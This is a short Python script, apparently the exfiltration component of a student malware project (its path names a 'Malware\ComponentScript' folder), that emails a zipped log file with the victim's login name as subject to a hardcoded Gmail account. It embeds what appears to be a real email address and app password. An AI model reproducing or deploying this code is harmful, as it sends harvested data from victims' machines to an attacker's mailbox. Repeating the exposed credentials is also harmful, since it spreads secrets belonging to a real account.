import smtplib
import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

today = datetime.date.today()
EMAIL = "six6six6six6six6ix@gmail.com" 
SUBJECT = os.getlogin()
BODY = today.strftime("%d %B, %Y")
PASSWORD = "uaoq cciz hdaq sncp"

message = MIMEMultipart()
message["From"] = EMAIL
message["To"] = EMAIL
message["Subject"] = SUBJECT
message.attach(MIMEText(BODY, "plain"))

# File path
file_path = r"C:\Users\rvm85\OneDrive - AP Hogeschool Antwerpen\Documenten\rasp pico\ProjectFolder\Malware\ComponentScript\Logs_26.12.2024_00.19.47.zip"
# Add attachment
if os.path.exists(file_path):
    with open(file_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f'attachment; filename="{os.path.basename(file_path)}"',
        )
        message.attach(part)
else:
    print("Attachment file not found.")
        
server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
server.starttls()

server.login(EMAIL, PASSWORD)

server.sendmail(EMAIL, EMAIL, message.as_string())
server.quit()